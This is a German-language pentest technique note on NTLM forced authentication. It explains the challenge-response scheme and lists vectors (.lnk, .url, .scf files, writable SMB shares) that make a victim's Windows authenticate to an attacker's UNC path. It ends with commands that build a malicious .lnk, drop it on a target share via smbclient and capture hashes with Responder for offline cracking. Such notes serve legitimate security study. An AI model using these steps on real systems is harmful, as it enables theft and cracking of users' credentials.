---
tags: [technique, windows, credential-access]
aliases: [Forced Authentication, LNK Hash Leak, NTLM, NTLMv2]
---
# NTLM Hash Leak (Forced Authentication)

> Windows gegen einen **UNC-Pfad zu dir** (`\\<attacker-ip>\share`) authentifizieren lassen → es schickt automatisch den NTLMv2-Hash, den du abfängst und crackst.

## Hintergrund: NTLM
NTLM ist das Windows-Verfahren, mit dem ein System beim Ressourcen-Zugriff (SMB-Shares, RDP, Windows-Auth-Websites) beweist, **wer der Nutzer ist**. Ablauf (Challenge-Response):
1. Client sendet **Username** an den Server.
2. Server schickt eine **zufällige Challenge** zurück.
3. Client verschlüsselt die Challenge mit seinem **Passwort-Hash** → NTLMv2-Response.
4. Server prüft die Antwort.

=> Über die Leitung geht nur der **Response** (Challenge + Hash-Berechnung), nie das Passwort.

Angriffsfläche für diese Technik:
- Der mitgeschnittene **NTLMv2-Response** lässt sich **offline cracken** → [[Hash Cracking]] (Format `netntlmv2`).
- Windows authentifiziert sich teils **automatisch** gegen UNC-Pfade (`\\host\share`) — genau das wird hier erzwungen.

## Prinzip
1. Datei/Ressource verweist auf `\\<attacker-ip>\...`
2. Opfer löst die Auflösung aus (Öffnen, **Vorschau**, teils nur Rechtsklick).
3. Windows authentifiziert sich automatisch → Hash geht an deinen Listener ([[Responder]]).
4. Hash offline cracken → [[Hash Cracking]].

## Vektoren
| Typ        | Auslöser                                             |
| ---------- | ---------------------------------------------------- |
| `.lnk`     | **Rechtsklick/Preview** (2025er Research) – kein CVE  |
| `.url`     | Datei mit `URL=file://\\attacker\...`                |
| `.scf`     | Icon lädt von UNC-Pfad                               |
| SMB-Share  | präparierte Datei auf beschreibbarem Share ablegen   |

> [!note] Mark of the Web
> MS blockt den `.lnk`-Vektor nur bei **aus dem Internet geladenen** Dateien (MotW). Dateien auf **internen Shares** tragen kein MotW → weiterhin verwundbar.

## `.lnk` unter Linux bauen
```bash
x86_64-w64-mingw32-gcc -o poc poc.c   # poc.c zeigt auf \\<tun0-ip>\share
wine poc.exe                          # erzeugt poc.lnk
smbclient //<ziel>/share -N -c 'put poc.lnk'
```
Dann [[Responder]] laufen lassen und auf die Auth warten.
